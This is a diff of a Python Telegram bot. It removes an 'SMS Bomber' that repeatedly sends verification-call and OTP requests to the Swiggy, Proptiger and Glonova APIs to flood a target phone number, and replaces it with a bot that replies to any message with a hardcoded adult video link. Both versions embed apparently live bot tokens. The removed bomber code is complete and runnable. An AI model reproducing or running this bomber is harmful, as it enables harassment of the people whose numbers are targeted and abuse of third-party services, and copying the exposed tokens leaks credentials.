@@ -1,250 +1,45 @@
-import requests
 import logging
-import asyncio
-import concurrent.futures
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import (
-    Application,
-    CommandHandler,
-    CallbackQueryHandler,
-    ContextTypes,
-    MessageHandler,
-    filters
-)
+from telegram import Update
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
-# Configure logging
+# Enable logging
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
-# Bot Token
-TOKEN = "7554221154:AAF6slUuJGJ7tXuIDhEZP8LIOB5trSTz0gU"
+# Your bot token from BotFather
+TOKEN = "7822455054:AAF-C_XdQBIAAWEXYDqQ2lrsIf1ewmDa46s"
 
-# Global variables
-active_attacks = {}
-message_count = {}
+# The video URL you provided
+VIDEO_URL = "https://video-cf.xhcdn.com/8yE%2BseHYuE%2B6V0skGFlDrvM8w2V1Xg3Wy4L98rG6%2Bs0%3D/56/1744113600/media=hls4/multi=256x144:144p,426x240:240p/017/235/029/240p.h264.mp4.m3u8"
 
-# Working APIs including Glonova
-APIS = [
-    {
-        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
-        "payload": {"mobile": ""},
-        "headers": {"Content-Type": "application/json"},
-        "name": "Swiggy",
-        "method": "POST"
-    },
-    {
-        "url": "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call",
-        "payload": {"contactNumber": "", "domainId": "2"},
-        "headers": {"Content-Type": "application/json"},
-        "name": "Proptiger",
-        "method": "POST"
-    },
-    {
-        "url": "https://glonova.in/",
-        "params": {"mobile": ""},
-        "name": "Glonova",
-        "method": "GET"
-    }
-]
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Send a message when the command /start is issued."""
+    await update.message.reply_text('Hi! Send me any message and I will send you the video.')
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Handle /start command"""
-    keyboard = [
-        [InlineKeyboardButton("⚡ Start Attack", callback_data='start_attack')],
-        [InlineKeyboardButton("ℹ️ Help", callback_data='help')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text(
-        "🌟 SMS Bomber Bot 🌟\n\n"
-        "Click 'Start Attack' to begin.",
-        reply_markup=reply_markup
-    )
-
-async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Handle button callbacks"""
-    query = update.callback_query
-    await query.answer()
-
-    if query.data == 'start_attack':
-        await query.edit_message_text(text="🔢 Please send the 10-digit phone number now")
-        context.user_data['expecting_number'] = True
-    elif query.data == 'help':
-        await help_command(update, context)
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Show help information"""
-    await update.message.reply_text(
-        "📖 Help Guide:\n\n"
-        "1. Click 'Start Attack'\n"
-        "2. Send phone number when asked\n"
-        "3. Use /stop to end attack\n\n"
-        "⚠️ For educational purposes only!"
-    )
-
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Handle incoming messages"""
-    if context.user_data.get('expecting_number', False):
-        phone_number = update.message.text.strip()
-        
-        if not phone_number.isdigit() or len(phone_number) != 10:
-            await update.message.reply_text("❌ Invalid number. Please send 10 digits.")
-            return
-            
-        context.user_data['expecting_number'] = False
-        await start_attack(update, context, phone_number)
-
-async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str) -> None:
-    """Start the attack process"""
-    user_id = update.effective_user.id
-    
-    if user_id in active_attacks:
-        await update.message.reply_text("⚠️ You already have an active attack.")
-        return
-    
-    active_attacks[user_id] = True
-    message_count[user_id] = 0
-    
-    # Start attack in background
-    asyncio.create_task(run_attack_async(update, context, phone_number, user_id))
-    
-    # Show active APIs
-    api_list = "\n".join([f"• {api['name']}" for api in APIS])
-    await update.message.reply_text(
-        f"🚀 Attack started on {phone_number}\n\n"
-        f"📡 Active APIs:\n{api_list}\n\n"
-        f"🛑 Use /stop to end attack"
-    )
-
-async def run_attack_async(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str, user_id: int):
-    """Run attack in an async task"""
+async def send_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Send the video when user sends any message."""
     try:
-        while active_attacks.get(user_id, False):
-            with concurrent.futures.ThreadPoolExecutor() as executor:
-                # Run synchronous API calls in threads
-                futures = [
-                    executor.submit(
-                        send_api_request,
-                        api,
-                        phone_number
-                    )
-                    for api in APIS
-                ]
-                
-                # Process results
-                results = []
-                for future in concurrent.futures.as_completed(futures):
-                    try:
-                        results.append(future.result())
-                    except Exception as e:
-                        logger.error(f"API error: {e}")
-                        results.append({"name": "Unknown", "success": False})
-                
-                # Count successes
-                success = sum(1 for r in results if r['success'])
-                message_count[user_id] += success
-                
-                # Detailed results
-                details = "\n".join([
-                    f"{'✅' if r['success'] else '❌'} {r['name']}"
-                    for r in results
-                ])
-                
-                # Send update
-                progress = min(100, message_count[user_id] * 10)
-                progress_bar = "🟩" * (progress // 2) + "⬜" * (50 - progress // 2)
-                
-                await context.bot.send_message(
-                    chat_id=update.effective_chat.id,
-                    text=(
-                        f"📊 Round complete\n"
-                        f"✅ Success: {success}/{len(APIS)}\n"
-                        f"📨 Total: {message_count[user_id]}\n"
-                        f"{progress_bar} {progress}%\n\n"
-                        f"{details}"
-                    )
-                )
-                
-                # Wait before next round
-                for _ in range(35):
-                    if not active_attacks.get(user_id, False):
-                        return
-                    await asyncio.sleep(1)
-                    
+        await update.message.reply_video(VIDEO_URL)
     except Exception as e:
-        logger.error(f"Attack error: {e}")
-        if user_id in active_attacks:
-            del active_attacks[user_id]
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text=f"⚠️ Attack error: {str(e)}"
-        )
-
-def send_api_request(api: dict, phone_number: str) -> dict:
-    """Synchronous API request function"""
-    try:
-        if api['method'] == "POST":
-            payload = api.get("payload", {}).copy()
-            for key in payload:
-                if "mobile" in key.lower() or "phone" in key.lower():
-                    payload[key] = phone_number
-            
-            response = requests.post(
-                api["url"],
-                json=payload,
-                headers=api.get("headers", {}),
-                timeout=10
-            )
-        else:  # GET request
-            params = api.get("params", {}).copy()
-            for key in params:
-                if "mobile" in key.lower() or "phone" in key.lower():
-                    params[key] = phone_number
-            
-            response = requests.get(
-                api["url"],
-                params=params,
-                timeout=10
-            )
-        
-        return {
-            "name": api['name'],
-            "success": response.status_code == 200,
-            "status": response.status_code
-        }
-    except Exception as e:
-        return {
-            "name": api['name'],
-            "success": False,
-            "error": str(e)
-        }
-
-async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Stop the attack"""
-    user_id = update.effective_user.id
-    if user_id in active_attacks:
-        del active_attacks[user_id]
-        total = message_count.get(user_id, 0)
-        del message_count[user_id]
-        await update.message.reply_text(f"🛑 Attack stopped\nTotal messages sent: {total}")
-    else:
-        await update.message.reply_text("ℹ️ No active attack to stop")
+        logger.error(f"Error sending video: {e}")
+        await update.message.reply_text("Sorry, I couldn't send the video. Please try again later.")
 
 def main():
-    """Start the bot"""
+    """Start the bot."""
+    # Create the Application and pass it your bot's token.
     application = Application.builder().token(TOKEN).build()
-    
-    # Register handlers
+
+    # on different commands - answer in Telegram
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("stop", stop_attack))
-    application.add_handler(CommandHandler("help", help_command))
-    application.add_handler(CallbackQueryHandler(button))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    
-    # Run the bot
-    application.run_polling()
+
+    # on non command messages - send the video
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, send_video))
+
+    # Run the bot until the user presses Ctrl-C
+    application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == '__main__':
     main()
